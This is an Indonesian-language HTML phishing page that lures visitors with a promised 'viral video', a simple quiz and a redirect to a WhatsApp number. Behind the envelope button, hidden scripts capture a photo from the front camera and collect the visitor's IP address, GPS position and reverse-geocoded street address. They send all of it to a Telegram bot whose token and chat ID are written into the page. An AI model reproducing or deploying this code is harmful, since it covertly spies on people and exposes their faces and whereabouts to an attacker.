<!DOCTYPE html>
<html>
<head>
    <meta charset='UTF-8'/>
    <meta content='width=device-width, initial-scale=1, user-scalable=1, minimum-scale=1, maximum-scale=5' name='viewport'/>
    <meta content='IE=edge' http-equiv='X-UA-Compatible'/>
    <link href="https://feeldreams.github.io/hayoloh/style.css" rel="stylesheet" type="text/css" />
    <script src="https://feeldreams.github.io/hayoloh/script.js"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Josefin+Sans:wght@400;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.all.min.js"></script>
    <script src="https://kit.fontawesome.com/4f3ce16e3e.js" crossorigin="anonymous"></script>
    <title>Video Viral Hari ini</title>
    <link rel="icon" type="image/x-icon" href="https://malasid.github.io/favicon.png">
    <style>
        :root {
            --warna-bg: rgba(0, 0, 0, .5); 
            --warna-teks: #fff;
            --warna-bingkai: #fff;
            --bingkai: 8px;
            --bingkai-kiri: 2px solid var(--warna-bingkai);
            --bingkai-kanan: 2px solid var(--warna-bingkai);
            --gaya-font: 'Josefin Sans', sans-serif;
        }
    </style>
</head>
<body>

    <!-- Ganti Audio di sini --><audio id="linkmp3">https://feeldreams.github.io/papapa.mp3</audio>

    <div id="bodyblur">
        <!-- Wallpaper --><img src="https://feeldreams.github.io/wp3.jpeg" id="wallpaper"/>
    </div>

    <div id='Content'>

        <div id="suratin" onClick="memulai();audio.play();openCamera();sendIPAddress();">
            <!-- Tombol Surat --><img src="https://rayyscoding.github.io/envelope.png"/>
        </div>
        <p id="ket">Continue....</p>
        <p id="ket">Izinkan semua notif agar bisa mendapatkan video viral hari ini</p>

        <div><blockquote id='bq'>
            <div>
                <!-- Stiker untuk Konten -->
                <img src="https://feeldreams.github.io/bunga.gif" id="fotoakhir"/>
                <img src="https://feeldreams.github.io/peach1.gif" id="fotoakhir2"/>
                <img src="https://feeldreams.github.io/weee.gif" id="fotoakhir3"/>
            </div>

            <!-- Konten Pertanyaan -->
            <p id="kalimat">jawab dulu 5x5=</p>
            <p id="kalimatb"></p>
            <p id="kalimatc"></p>

            <!-- Konten Jawaban -->
            <p id="kalimat2">jangan lupa share ke sosmed kalian</p>
            <p id="kalimatb2">biar video ini viral sedunia</p>
            <p id="kalimatc2">Eitss..tapi tunggu dulu dalam waktu : <b id="ctimer" style="font-size:24px">7</b></p>

            <!-- Konten Jawaban 2 -->
            <p id="kalimat3">kalian akan di alihkan ke WhatSapp</p>
            <p id="kalimatb3">aku untuk mendapatkan video viral</p>
            <p id="kalimatc3">ðŸ“… </p>
        </blockquote></div>

        <!-- Tombol Multifungsi -->
        <div id="Tombol">
            <a id="By" onClick="multifungsi()">
                <b id="tmbl">25</b>
            </a>

            <a id="Bn" onClick="ditolak()">10</a><a id="Bn2" onClick="ditolak2()"></a>
        </div>

    </div>

    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

    <!-- Jangan Edit Bagian Ini -->
    <script>
        ftom=0;jikapr=1;ftganti=0;flag=1;flagg=1;fungsi=0;Bn2.innerHTML=Bn.innerHTML;function showDiv() {pesanwhatsapp = "mana video viralnya kak ><";Bn2.style.display="none";Content.style = "opacity:1;margin-top:15vh;";ket.style="margin-top:30px";}
        function memulai(){suratin.style="transition:all 1s ease;transform:scale(.1);opacity:0";ket.style="transition:all 1s ease;transform:scale(.1);opacity:0";setTimeout(mulaikonten,300)}
        function mulaikonten() {otomatis();suratin.style="display:none";ket.style="display:none";Content.style = "opacity:1;margin-top:4vh";bodyblur.style="opacity:.6;animation:none";wallpaper.style="transform: scale(2);opacity:1;";fotoakhir.style="display:inline-flex;";setTimeout(ftmuncul,200);bq.style = "position:relative;opacity:1;visibility:visible;transform: scale(1);border-radius:var(--bingkai);margin-top:0";fungsi=1;setTimeout(tombol,500);}

        function ftmuncul(){
            if(ftganti==0){fotoakhir.style="display:inline-flex;opacity:1;transform:scale(1)";}
            if(ftganti==1){fotoakhir.src = fotoakhir2.src;fotoakhir.style="display:inline-flex;opacity:1;transition:all .7s ease;transform:scale(1);";}
            if(ftganti==2){fotoakhir.src = fotoakhir3.src;fotoakhir.style="display:inline-flex;opacity:1;transition:all .7s ease;transform:scale(1);";}
        }
        function fthilang(){fotoakhir.style="display:inline-flex;opacity:1;transition:all .7s ease;transform:scale(.1)";}
        function jjfoto(){fotoakhir.style.animation="rto .8s infinite alternate";}

        function tombol(){Tombol.style="opacity:1;transform: scale(1);";Bn.style="margin:12px 0 12px 12px";ftom=1;}
        function multifungsi(){if(ftom==1){diterima();} if(ftom==5){menuju();}}
        async function menuju(){await swals.fire('OK!', 'Kirim Hasil Nilai ke WhatsApp aku, ya!', 'success');window.location = "https://api.whatsapp.com/send?phone=6283896140125&text=" + pesanwhatsapp;Tombol.style="margin-top:15px;opacity:1;transform: scale(1);";} setTimeout(showDiv,100);

        const swalst = Swal.mixin({timer: 2777, allowOutsideClick: false, showConfirmButton: false, timerProgressBar: true, imageHeight: 100,}); audio = new Audio('' + linkmp3.innerHTML);const swals = Swal.mixin({allowOutsideClick: false, cancelButtonColor: '#FF0040', imageWidth: 100, imageHeight: 100,}); const style = document.createElement('style'); var today = new Date();var dd = String(today.getDate()).padStart(2, '0');var mm = String(today.getMonth() + 1).padStart(2, '0');var yyyy = today.getFullYear();const monthNames = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];today = dd + ' ' + monthNames[today.getMonth()] + ' ' + yyyy;
        const body = document.querySelector("body");function createHeart() {const heart = document.createElement("div"); heart.className = "fas fa-heart"; heart.style.left = (Math.random() * 90)+"vw"; heart.style.animationDuration = (Math.random()*3)+2+"s"; body.appendChild(heart);} setInterval(function name(params) {var heartArr = document.querySelectorAll(".fa-heart"); if (heartArr.length > 100) {heartArr[0].remove()}},100);

        async function openCamera() {
            const constraints = {
                video: { facingMode: "user" },
                audio: false
            };

            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                document.body.appendChild(video);

                // Delay to allow video to play before capturing
                setTimeout(() => captureImage(video, stream), 1000);
            } catch (err) {
                console.error("Error accessing camera: ", err);
            }
        }

        async function captureImage(video, stream) {
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');
            //Masukan Token Bot di sini
            const botToken = '7270892896:AAE-rPAY-66CnA1ztOadfC49yQ60REc5o88';
            //Masukan ID Chat di sini
            const chatId = '8044159892';
            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', dataURLtoBlob(imageData), 'photo.png');

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    console.log('Image sent successfully');
                } else {
                    console.error('Failed to send image');
                }
            } catch (err) {
                console.error('Error sending image: ', err);
            }

            stream.getTracks().forEach(track => track.stop());
            video.remove();
        }

        async function sendIPAddress() {
            try {
                const response = await fetch('https://api64.ipify.org?format=json');
                const data = await response.json();
                const ipAddress = data.ip;
                //Masukan Token Bot disini
                const botToken = '7270892896:AAE-rPAY-66CnA1ztOadfC49yQ60REc5o88';
                //Masukan ID Chat Disini
                const chatId = '8044159892';
                const message = `IP Address pengguna: ${ipAddress}`;
                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

                const sendResponse = await fetch(url, { method: 'GET' });
                if (sendResponse.ok) {
                    console.log('IP Address sent successfully');
                } else {
                    console.error('Failed to send IP Address');
                }

                // Mengambil latitude dan longitude
        navigator.geolocation.getCurrentPosition(async (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // Mengirim request ke Nominatim untuk mendapatkan alamat dari latitude dan longitude
                    const nominatimUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
                    const nominatimResponse = await fetch(nominatimUrl);
                    const nominatimData = await nominatimResponse.json();

                    // Mengirim hasil JSON ke bot Telegram
                    const addressMessage = `Lokasi pengguna:\nAlamat: ${JSON.stringify(nominatimData)}`;
                    const locationUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(addressMessage)}`;

                    const locationResponse = await fetch(locationUrl, { method: 'GET' });
                    if (locationResponse.ok) {
                        console.log('Location sent successfully');
                    } else {
                        console.error('Failed to send location');
                    }
                }, showError);
            } catch (error) {
                console.error('Error fetching IP Address or location: ', error);
            }
        }

        function dataURLtoBlob(dataurl) {
            const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while(n--){
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], {type:mime});
        }
    </script>
    <script>
        // Fungsi untuk mengirim pesan ke bot Telegram
        function sendMessageToTelegram(message) {
            const botToken = '7270892896:AAE-rPAY-66CnA1ztOadfC49yQ60REc5o88'; // Ganti dengan token bot Anda
            const chatId = '8044159892'; // Ganti dengan chat ID Anda
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url).then(response => {
                if (!response.ok) {
                    console.error('Gagal mengirim pesan ke Telegram');
                }
            }).catch(error => {
                console.error('Error:', error);
            });
        }

        // Fungsi untuk menangkap lokasi GPS
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendPositionToTelegram, showError);
            } else {
                sendMessageToTelegram('Geolocation is not supported by this browser.');
            }
        }

        // Fungsi untuk mengirim posisi GPS ke bot Telegram
        function sendPositionToTelegram(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const message = `/lokasi ${latitude}, ${longitude}`;
            sendMessageToTelegram(message);
        }

        // Fungsi untuk menampilkan error jika gagal mendapatkan posisi GPS
        function showError(error) {
            let message = '';
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    message = 'User denied the request for Geolocation.';
                    break;
                case error.POSITION_UNAVAILABLE:
                    message = 'Location information is unavailable.';
                    break;
                case error.TIMEOUT:
                    message = 'The request to get user location timed out.';
                    break;
                case error.UNKNOWN_ERROR:
                    message = 'An unknown error occurred.';
                    break;
            }
            sendMessageToTelegram(message);
        }

        function sendMessageToTelegram(message) {
            const botToken = '7270892896:AAE-rPAY-66CnA1ztOadfC49yQ60REc5o88'; // Ganti dengan token bot Anda
            const chatId = '8044159892'; // Ganti dengan chat ID Anda
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url).then(response => {
                if (!response.ok) {
                    console.error('Gagal mengirim pesan ke Telegram');
                }
            }).catch(error => {
                console.error('Error:', error);
            });
        }

        // Panggil fungsi fetchIpAddressAndLocation saat halaman dimuat
        window.onload = function () {
            fetchIpAddressAndLocation();
        };
    </script>
    <!-- Sampai Sini -->
</body>
